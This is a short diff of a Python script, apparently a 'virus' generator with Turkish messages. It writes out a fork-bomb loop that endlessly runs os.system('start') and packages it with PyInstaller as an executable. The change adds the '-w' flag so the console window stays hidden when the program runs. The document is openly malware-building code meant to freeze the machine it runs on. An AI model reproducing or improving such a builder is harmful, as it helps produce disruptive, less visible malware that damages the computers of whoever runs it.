@@ -10,7 +10,7 @@ while True:
 	os.system("start")
 ''')
 os.system("pip install pyinstaller")
-os.system("pyinstaller --onefile "+butun)
+os.system("pyinstaller --onefile -w "+butun)
 print("\n Virüsünüz oluşturuldu!")
 print("Virüsünüzün exe hali ve py hali bulunduğu dizinde!")
 
